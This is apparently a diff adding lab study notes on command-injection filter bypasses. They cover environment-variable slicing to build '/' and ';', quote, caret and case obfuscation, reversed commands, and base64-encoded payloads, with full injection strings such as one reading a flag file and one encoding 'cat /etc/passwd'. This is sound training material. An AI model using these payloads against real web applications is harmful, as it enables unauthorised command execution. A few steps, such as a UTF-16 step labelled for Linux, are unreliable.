@@ -1,3 +1,5 @@
+[Command Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)
+
 To inject an additional command to the intended one, we may use any of the following operators:
 | **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
 |------------------------|-------------------------|-----------------------------|----------------------|
@@ -28,4 +30,118 @@ Just be mindful that operators may not work on specific set ups:
 - `127.0.0.1%0a{ls,-la}` will inject the `ls -la` command
 
   ## Bypassing `/` or `\`
+  One such technique we can use for replacing slashes (or any other character) is through `Linux Environment Variables`
+  - For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:
+```
+Lumington@htb[/htb]$ echo ${PATH}
+/usr/local/bin:/usr/bin:/bin:/usr/games
+```
+- So, if we start at the 0 character, and only take a string of length 1, we will end up with only the / character, which we can use in our payload:
+```
+Lumington@htb[/htb]$ echo ${PATH:0:1}
+/
+```
+- We can also use the same concept to get a semi-colon character, to be used as an injection operator.
+```
+Lumington@htb[/htb]$ echo ${LS_COLORS:10:1}
+;
+```
 
+Same works on Windows:
+```
+C:\htb> echo %HOMEPATH:~6,-11%
+\
+
+---
+OR
+---
+
+PS C:\htb> $env:HOMEPATH[0]
+\
+
+---
+OR
+---
+
+PS C:\htb> $env:PROGRAMFILES[10]
+PS C:\htb>
+
+```
+
+## Character Shifting
+There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with man ascii), then add it instead of [ in the below example. This way, the last printed character would be the one we need:
+```
+Lumington@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
+Lumington@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
+
+\
+```
+Find the user on in the `home` directory:
+-`ip=127.0.0.1%0a{ls,-la,${PATH:0:1}home}`
+
+Find the flag in that users directory:
+- `ip=127.0.0.1%0a{c"a"t,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}`
+
+## Bypassing commands
+### For both `Windows` and `Linux`
+- One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote ' and a double-quote "
+- The important things to remember are that we cannot mix types of quotes and the number of quotes must be even.
+- One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.
+
+### For Linux
+- commands are case sensitive so case manipulation might work
+Both will work: 
+```
+who$@ami
+w\ho\am\i
+```
+
+### For Windows
+- Commands are case in-sensitive so case manipulation won't work
+Use `^`
+```
+C:\htb> who^ami
+
+21y4d
+```
+### Command Reversing
+Somehow this works..
+```
+Lumington@htb[/htb]$ echo 'whoami' | rev
+imaohw
+```
+So writing it in reverse and commanding it backwards like this in Linux:
+```
+21y4d@htb[/htb]$ $(rev<<<'imaohw')
+
+21y4d
+```
+And this in Windows:
+```
+PS C:\htb> "whoami"[-1..-20] -join ''
+
+imaohw
+```
+Both will execute the `whoami` command if the command is typed in backwards
+
+**Note: using <<< to avoid using a pipe |, which is a filtered character.**
+
+### Encoding commands
+```
+Lumington@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
+
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+```
+For this to work on Linux - we would have to convert the string from utf-8 to utf-16 before we base64 it, as follows:
+```
+Lumington@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+
+dwBoAG8AYQBtAGkA
+```
+For this to work on Windows, execute it with a PowerShell sub-shell (iex "$()"), as follows:
+
+```
+PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+
+21y4d
+```
